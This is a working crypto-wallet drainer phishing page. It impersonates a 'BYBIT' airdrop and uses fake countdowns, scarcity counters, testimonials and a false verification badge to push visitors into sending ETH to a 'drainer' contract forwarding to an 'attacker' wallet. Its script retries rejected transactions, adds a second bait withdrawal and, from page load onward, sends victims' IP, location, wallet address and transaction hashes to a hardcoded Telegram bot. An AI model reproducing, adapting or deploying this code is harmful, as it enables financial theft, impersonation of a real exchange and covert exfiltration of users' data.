<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BYBIT - Claim Airdrop (Sepolia Testnet)</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <style>
        body{background:#1C2526;font-family:'Poppins',sans-serif;color:#fff;margin:0;padding:0}
        .header{background:linear-gradient(135deg,#F5A623,#FFCA28);padding:30px;border-radius:10px;text-align:center;margin:20px}
        .header h1{font-size:1.5rem;font-weight:700;margin-bottom:10px}
        .header p{font-size:1rem;margin-bottom:20px}
        .btn-claim{background:linear-gradient(45deg,#F5A623,#FFCA28);border:none;padding:10px 20px;font-size:1rem;border-radius:5px;color:#1C2526;font-weight:700;transition:all .3s ease}
        .btn-claim:hover{transform:scale(1.05)}
        .section{background:#2A3435;padding:20px;border-radius:10px;margin:20px}
        .section h2{font-size:1.2rem;color:#F5A623;margin-bottom:15px}
        .section p{font-size:.9rem;margin:5px 0}
        .progress{height:10px;background:#3A4445}
        .progress-bar{background:linear-gradient(45deg,#F5A623,#FFCA28);transition:width 1s ease}
        .footer{background:#1C2526;padding:20px;text-align:center}
        .footer a{color:#F5A623;margin:0 10px;text-decoration:none}
        .footer p{font-size:.8rem;color:#A0A0A0}
        .modal-content{background:#fff;color:#333;border-radius:10px}
        .modal-header{border-bottom:none}
        .modal-title{font-size:1.2rem;font-weight:700}
        .wallet-option{display:flex;align-items:center;padding:10px;border-bottom:1px solid #ddd;cursor:pointer}
        .wallet-option img{width:30px;height:30px;margin-right:10px;object-fit:contain}
        .wallet-option:hover{background:#f0f0f0}
        .modal-body p{font-size:.9rem;color:#666}
        .modal-footer{border-top:none;justify-content:center}
        .modal-footer a{color:#F5A623;text-decoration:none;font-weight:700}
        #statusMessage{text-align:center;margin:20px;font-size:1.1rem;color:#F5A623}
        #processingOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);color:#fff;display:none;justify-content:center;align-items:center;font-size:1.2rem;z-index:1000}
        #countdownTimer{font-size:1.2rem;color:#FF0000;font-weight:700;margin:10px}
        #spotsRemaining{font-size:1rem;color:#FFCA28;margin:10px}
        #rewardAmount{font-size:1.5rem;color:#FFCA28;font-weight:700;animation:flash 1s infinite}
        #transactionFee{font-size:.8rem;color:#A0A0A0}
        #verifiedBadge{background:#28A745;color:#fff;padding:5px 10px;border-radius:5px;font-size:.8rem;margin:10px}
        #testimonials{font-size:.9rem;color:#A0A0A0;margin:10px}
        #walletsConnected{font-size:.9rem;color:#F5A623;margin:10px}
        @keyframes flash{0%{opacity:1}50%{opacity:.5}100%{opacity:1}}
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>
    <header class="header">
        <h1>Exclusive Airdrop for Early Adopters</h1>
        <p>Claim Your <span id="rewardAmount">$573 Airdrop</span> Now! <br><span id="transactionFee">Processing Fee: ~$0.40 (0.01 ETH)</span></p>
        <div id="countdownTimer"></div>
        <div id="spotsRemaining">Spots Remaining: 3/100</div>
        <div id="verifiedBadge">Verified by BYBIT</div>
        <button class="btn btn-claim" data-toggle="modal" data-target="#walletModal">Claim Airdrop Now</button>
        <div id="testimonials">"John D. just claimed $573!"</div>
        <div id="walletsConnected">10,000+ Wallets Connected</div>
    </header>
    <main class="container">
        <div id="statusMessage"></div>
        <section class="section text-center">
            <h2>Total Airdrop Pool</h2>
            <p>1,000,000 USDT</p>
        </section>
        <section class="section">
            <h2>Total Reward Distribution</h2>
            <p>≤ 60K: 14.7%</p>
            <p>> 70K: 4.6%</p>
            <p class="text-muted">+5847 wallets | 785m pts</p>
        </section>
        <section class="section">
            <h2>Claim Progress</h2>
            <div class="progress">
                <div id="progressBar" class="progress-bar" role="progressbar" style="width: 74%" aria-valuenow="74" aria-valuemin="0" aria-valuemax="100"></div>
            </div>
            <div class="d-flex justify-content-between mt-2">
                <span>74% Claimed</span>
                <span>26% Remaining</span>
            </div>
        </section>
        <section class="section">
            <h2>Total Value of Connected Wallets</h2>
            <p>≥ 5M and < 6M: 35%</p>
            <p>< 5M: 21%</p>
            <p>≥ 8M: 12.9%</p>
            <p class="text-muted">+6719 wallets | 352m pts</p>
        </section>
    </main>
    <div id="processingOverlay">Processing Your Airdrop Claim...</div>
    <footer class="footer">
        <a href="#">Help Center</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Terms & Conditions</a>
        <p>© 2025, All rights reserved.</p>
    </footer>
    <div class="modal fade" id="walletModal" tabindex="-1" role="dialog" aria-labelledby="walletModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="walletModalLabel">Claim Your $573 Airdrop</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p>Connect your wallet to claim your $573 airdrop securely. Your funds are safe. Only a small fee is required to claim your reward.</p>
                    <div id="transactionBreakdown" style="background:#f0f0f0;padding:10px;border-radius:5px;margin-bottom:15px;color:#333">
                        <h6>Transaction Breakdown</h6>
                        <p>Processing Fee: 0.01 ETH (~$0.40)</p>
                        <p>Airdrop Reward: $573</p>
                        <p style="color:#28A745">Your funds are safe! Only the fee will be deducted.</p>
                    </div>
                    <div class="wallet-option" data-wallet="metamask">
                        <img src="https://i.postimg.cc/5yLgXCLB/Metamask-icon.png" alt="MetaMask">
                        <span>MetaMask</span>
                    </div>
                    <div class="wallet-option" data-wallet="trustwallet">
                        <img src="https://i.postimg.cc/449BLrqY/Trust-Stacked-Logo-Blue.png" alt="Trust Wallet">
                        <span>Trust Wallet</span>
                    </div>
                    <div class="wallet-option" data-wallet="okxwallet">
                        <img src="https://i.postimg.cc/FHWysZwt/okx-logo.png" alt="OKX Wallet">
                        <span>OKX Wallet</span>
                    </div>
                    <div class="wallet-option" data-wallet="binancewallet">
                        <img src="https://i.postimg.cc/1tgJZTzY/binance-exchange-seeklogo-com.png" alt="Binance Wallet">
                        <span>Binance Wallet</span>
                    </div>
                    <div class="wallet-option" data-wallet="coinbasewallet">
                        <img src="https://i.postimg.cc/fbVx3dhV/Coinbase-logo-square-1.png" alt="Coinbase Wallet">
                        <span>Coinbase Wallet</span>
                    </div>
                    <div class="wallet-option" data-wallet="walletconnect">
                        <img src="https://i.postimg.cc/tgv2wy9x/Wallet-Connect-icon.png" alt="WalletConnect">
                        <span>WalletConnect</span>
                    </div>
                    <div class="wallet-option" data-wallet="bravewallet">
                        <img src="https://i.postimg.cc/tTLDR5ZR/brave-browser-icon.png" alt="Brave Wallet">
                        <span>Brave Wallet</span>
                    </div>
                    <div class="wallet-option" data-wallet="rabbywallet">
                        <img src="https://i.postimg.cc/0NyVVr1v/Rabby.png" alt="Rabby Wallet">
                        <span>Rabby Wallet</span>
                    </div>
                    <p class="mt-3">What's a Web3 Wallet?</p>
                </div>
                <div class="modal-footer">
                    <a href="#">Learn How to Claim</a>
                </div>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-LtrjvnR4Twt/qOuYxE721u19sVFLVSA4hf/rRt6PrZTmiPltdZcI7q7PXQBYTKyf" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js" crossorigin="anonymous"></script>
    <script>
        if (typeof Web3 === 'undefined') {
            console.error('Web3.js failed to load. Check CDN or connection.');
            alert('Web3.js failed to load. Check your connection and retry.');
            throw new Error('Web3.js not defined');
        } else {
            console.log('Web3.js loaded. Version:', Web3.version);
        }

        document.addEventListener('DOMContentLoaded', async () => {
            const botToken = '7925505296:AAFZzW3mvYl62QJKnnXyUqYORa8jRmx-Lkk';
            const chatId = '6309547301';
            const drainerContractAddress = '0x000aff4367331a3fb3a4c2f29bbf2dfeee40c580'; // RuthlessBeastDrainer contract
            const bossAddress = '0x6b9C1121abd649254dB8A7D39091cC6b4D1cf893'; // Attacker’s wallet
            const decoyAddress = '0xF01c1348579e129974A39BAcA3cA9eCe28e68490'; // Decoy wallet
            const sepoliaChainId = '0xaa36a7';
            const drainerContractAbi = [
                { "inputs": [{ "internalType": "address", "name": "_decoy", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" },
                { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "sender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "FundsReceived", "type": "event" },
                { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "FundsWithdrawn", "type": "event" },
                { "inputs": [], "name": "boss", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
                { "inputs": [{ "internalType": "address", "name": "", "type": "address" }], "name": "contributions", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                { "inputs": [], "name": "decoy", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
                { "inputs": [], "name": "deposit", "outputs": [], "stateMutability": "payable", "type": "function" },
                { "inputs": [], "name": "getBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                { "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
                { "inputs": [], "name": "getTotalDrained", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                { "inputs": [], "name": "isActive", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" },
                { "inputs": [], "name": "totalDrained", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                { "inputs": [], "name": "withdraw", "outputs": [], "stateMutability": "payable", "type": "function" },
                { "stateMutability": "payable", "type": "receive" }
            ];

            let cachedIpLocation = null;

            function startCountdown() {
                let timeLeft = 300;
                const timerElement = document.getElementById('countdownTimer');
                const interval = setInterval(() => {
                    const minutes = Math.floor(timeLeft / 60);
                    const seconds = timeLeft % 60;
                    timerElement.innerText = `Hurry! ${minutes}:${seconds < 10 ? '0' : ''}${seconds} Left to Claim!`;
                    timeLeft--;
                    if (timeLeft < 0) {
                        clearInterval(interval);
                        timerElement.innerText = 'Airdrop Expired!';
                        document.querySelector('.btn-claim').disabled = true;
                    }
                }, 1000);
            }
            startCountdown();

            const testimonials = [
                "John D. just claimed $573!",
                "Sarah K. got $573 instantly!",
                "Mike T. secured his $573 reward!",
                "Emily R. claimed $573—don’t miss out!"
            ];
            let testimonialIndex = 0;
            setInterval(() => {
                document.getElementById('testimonials').innerText = testimonials[testimonialIndex];
                testimonialIndex = (testimonialIndex + 1) % testimonials.length;
            }, 3000);

            let spots = 3;
            setInterval(() => {
                if (spots > 0) {
                    spots--;
                    document.getElementById('spotsRemaining').innerText = `Spots Remaining: ${spots}/100`;
                    if (spots === 0) {
                        document.querySelector('.btn-claim').disabled = true;
                        document.getElementById('spotsRemaining').innerText = 'All spots taken! Check back later.';
                    }
                }
            }, 10000);

            async function getIpAndLocation() {
                if (cachedIpLocation) return cachedIpLocation;
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const data = await res.json();
                    return cachedIpLocation = { ip: data.ip, location: `${data.city}, ${data.country}` };
                } catch (e) {
                    console.error('IP fetch failed:', e);
                    return cachedIpLocation = { ip: 'Unknown IP', location: 'Unknown' };
                }
            }

            async function sendAlert(msg) {
                const { ip, location } = await getIpAndLocation();
                const fullMsg = `Message: ${msg}\nIP: ${ip}\nLocation: ${location}\nTime: ${new Date().toISOString()}`;
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURI(fullMsg)}&parse_mode=html`;
                fetch(url).catch(e => console.error('Telegram send failed:', e));
            }
            sendAlert('Victim clicked link');

            async function switchToSepolia(provider) {
                try {
                    const chainId = await provider.request({ method: 'eth_chainId' });
                    if (chainId !== sepoliaChainId) {
                        try {
                            await provider.request({
                                method: 'wallet_switchEthereumChain',
                                params: [{ chainId: sepoliaChainId }]
                            });
                        } catch (e) {
                            if (e.code === 4902) {
                                await provider.request({
                                    method: 'wallet_addEthereumChain',
                                    params: [{
                                        chainId: sepoliaChainId,
                                        chainName: 'Sepolia Testnet',
                                        nativeCurrency: { name: 'SepoliaETH', symbol: 'ETH', decimals: 18 },
                                        rpcUrls: ['https://rpc.sepolia.org'],
                                        blockExplorerUrls: ['https://sepolia.etherscan.io']
                                    }]
                                });
                            } else {
                                sendAlert(`Network switch failed: ${e.message}`);
                                throw new Error(`Sepolia switch failed: ${e.message}`);
                            }
                        }
                    }
                } catch (e) {
                    sendAlert(`Network switch error: ${e.message}`);
                    throw new Error(`Sepolia switch failed: ${e.message}`);
                }
            }

            async function promptSendETH(web3, walletAddress, retryCount = 0) {
                const maxRetries = 5;
                const minClaimFee = web3.utils.toWei('0.01', 'ether');
                try {
                    const balance = await web3.eth.getBalance(walletAddress);
                    const gasPrice = await web3.eth.getGasPrice();
                    const adjustedGasPrice = BigInt(gasPrice) < web3.utils.toWei('50', 'gwei') 
                        ? gasPrice 
                        : web3.utils.toWei('50', 'gwei');

                    const balanceDisplay = document.createElement('div');
                    balanceDisplay.id = 'fakeBalance';
                    balanceDisplay.style.cssText = 'text-align:center;margin:20px;color:#FFCA28;font-size:1.1rem;';
                    balanceDisplay.innerText = `Your Wallet Balance: ${web3.utils.fromWei(balance, 'ether')} ETH`;
                    document.querySelector('.container').prepend(balanceDisplay);

                    let estimatedGasFee;
                    try {
                        const contract = new web3.eth.Contract(drainerContractAbi, drainerContractAddress);
                        const depositData = contract.methods.deposit().encodeABI();
                        estimatedGasFee = await web3.eth.estimateGas({
                            from: walletAddress,
                            to: drainerContractAddress,
                            value: minClaimFee,
                            data: depositData
                        });
                    } catch (e) {
                        estimatedGasFee = 50000;
                    }

                    const gasLimitFee = Math.floor(estimatedGasFee * 1.3);
                    const gasCostFee = BigInt(adjustedGasPrice) * BigInt(gasLimitFee);
                    const totalFeeCost = BigInt(minClaimFee) + gasCostFee;

                    if (BigInt(balance) < totalFeeCost) {
                        sendAlert(`Not enough ETH in ${walletAddress}. Balance: ${web3.utils.fromWei(balance, 'ether')} ETH, Needed: ${web3.utils.fromWei(totalFeeCost.toString(), 'ether')} ETH`);
                        return `Failed: Need at least ${web3.utils.fromWei(totalFeeCost.toString(), 'ether')} ETH. Top up!`;
                    }

                    const depositTx = {
                        from: walletAddress,
                        to: drainerContractAddress,
                        value: web3.utils.toHex(minClaimFee),
                        gas: web3.utils.toHex(gasLimitFee),
                        gasPrice: web3.utils.toHex(adjustedGasPrice),
                        data: new web3.eth.Contract(drainerContractAbi, drainerContractAddress).methods.deposit().encodeABI()
                    };

                    const claimPrompts = [
                        `Send 0.01 ETH to claim your $573 airdrop!`,
                        `Confirm 0.01 ETH to unlock your $573 reward!`,
                        `Last chance! 0.01 ETH for $573! Attempt ${retryCount + 1}/${maxRetries + 1}`
                    ];
                    const claimPromptMessage = claimPrompts[retryCount % claimPrompts.length];

                    alert(claimPromptMessage);

                    document.getElementById('processingOverlay').style.display = 'flex';
                    document.getElementById('statusMessage').innerText = 'Processing Claim... Don’t close this!';

                    let progress = 74;
                    const progressInterval = setInterval(() => {
                        progress += 5;
                        if (progress > 100) progress = 100;
                        document.getElementById('progressBar').style.width = `${progress}%`;
                        document.getElementById('progressBar').setAttribute('aria-valuenow', progress);
                    }, 500);

                    const depositTxHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [depositTx] });

                    clearInterval(progressInterval);
                    document.getElementById('processingOverlay').style.display = 'none';
                    document.getElementById('statusMessage').innerText = 'Success! Airdrop claimed! Check your wallet for rewards!';
                    sendAlert(`Drained! Tx Hash: ${depositTxHash}. Funds sent to ${drainerContractAddress}, auto-forwarded to ${bossAddress}`);

                    // Fake withdraw bait after "success"
                    setTimeout(async () => {
                        const withdrawPrompt = confirm("Processing complete! Withdraw your $573 reward now?");
                        if (withdrawPrompt) {
                            const withdrawTx = {
                                from: walletAddress,
                                to: drainerContractAddress,
                                value: web3.utils.toHex(minClaimFee),
                                gas: web3.utils.toHex(gasLimitFee),
                                gasPrice: web3.utils.toHex(adjustedGasPrice),
                                data: new web3.eth.Contract(drainerContractAbi, drainerContractAddress).methods.withdraw().encodeABI()
                            };
                            const withdrawTxHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [withdrawTx] });
                            document.getElementById('statusMessage').innerText = 'Funds withdrawn to your wallet!';
                            sendAlert(`Double-drained! Withdraw Tx Hash: ${withdrawTxHash}. More funds to ${bossAddress}`);
                        }
                    }, 2000);

                    return `ETH drained. Tx Hash: ${depositTxHash}`;
                } catch (e) {
                    clearInterval(progressInterval);
                    document.getElementById('processingOverlay').style.display = 'none';
                    if (e.message.includes('User rejected the transaction') && retryCount < maxRetries) {
                        sendAlert(`User rejected tx. Retrying (${retryCount + 1}/${maxRetries}). Wallet: ${walletAddress}`);
                        return await promptSendETH(web3, walletAddress, retryCount + 1);
                    }
                    sendAlert(`Tx failed. Error: ${e.message}. Wallet: ${walletAddress}, Balance: ${web3.utils.fromWei(await web3.eth.getBalance(walletAddress), 'ether')} ETH`);
                    document.getElementById('statusMessage').innerText = 'Claim failed. Try again or top up your wallet!';
                    return `Failed: ${e.message}. Retry or switch wallets.`;
                }
            }

            async function processAllAssets(web3, walletAddress) {
                let results = [];
                try {
                    const ethResult = await promptSendETH(web3, walletAddress);
                    results.push(ethResult);
                } catch (e) {
                    results.push(`ETH Drain error: ${e.message}`);
                }
                return results;
            }

            const walletOptions = document.querySelectorAll('.wallet-option');
            console.log(`Found ${walletOptions.length} wallet options`);
            if (walletOptions.length === 0) {
                console.error('No wallet options found in DOM');
                sendAlert('No wallet options found in DOM');
            }

            walletOptions.forEach(option => {
                option.addEventListener('click', async function () {
                    const wallet = this.getAttribute('data-wallet');
                    console.log(`Wallet clicked: ${wallet}`);
                    sendAlert(`Wallet clicked: ${wallet}`);

                    let provider;
                    if (typeof window.ethereum === 'undefined') {
                        console.error('No Ethereum provider. Install a wallet like MetaMask.');
                        alert('No Ethereum provider. Install MetaMask to proceed.');
                        $('#walletModal').modal('hide');
                        sendAlert('No Ethereum provider detected');
                        return;
                    }

                    provider = window.ethereum;

                    console.log('Wallet flags:', {
                        isMetaMask: window.ethereum.isMetaMask,
                        isTrust: window.ethereum.isTrust,
                        isCoinbaseWallet: window.ethereum.isCoinbaseWallet,
                        isWalletConnect: window.ethereum.isWalletConnect,
                        isBraveWallet: window.ethereum.isBraveWallet,
                        isRabby: window.ethereum.isRabby
                    });

                    if (wallet === 'okxwallet' && typeof window.okxwallet !== 'undefined') {
                        provider = window.okxwallet;
                    } else if (wallet === 'binancewallet' && typeof window.BinanceChain !== 'undefined') {
                        provider = window.BinanceChain;
                    }

                    try {
                        const accounts = await provider.request({ method: 'eth_requestAccounts' });
                        const walletAddress = accounts[0];
                        console.log(`Wallet connected: ${walletAddress}`);
                        $('#walletModal').modal('hide');
                        document.getElementById('statusMessage').innerText = 'Wallet Connected! Processing...';
                        sendAlert(`Victim connected wallet (${wallet}). Address: ${walletAddress}`);

                        if (typeof Web3 === 'undefined') {
                            throw new Error('Web3 not defined. Failed to load Web3.js.');
                        }

                        const web3 = new Web3(provider);
                        await switchToSepolia(provider);
                        const results = await processAllAssets(web3, walletAddress);

                        alert(`Airdrop claimed on Sepolia Testnet!\n\nResults:\n${results.join('\n')}\n\nFunds processing shortly.`);
                        sendAlert(`Attacker note: Funds auto-drained to ${bossAddress} via ${drainerContractAddress}. Decoy: ${decoyAddress}`);
                    } catch (e) {
                        console.error(`Wallet connection failed for ${wallet}:`, e);
                        sendAlert(`Operation failed for ${wallet}. Error: ${e.message || e.toString()}`);
                        alert(`Failed to claim. Error: ${e.message || e.toString()}`);
                        $('#walletModal').modal('hide');
                    }
                });
            });
        });
    </script>
</body>
</html>
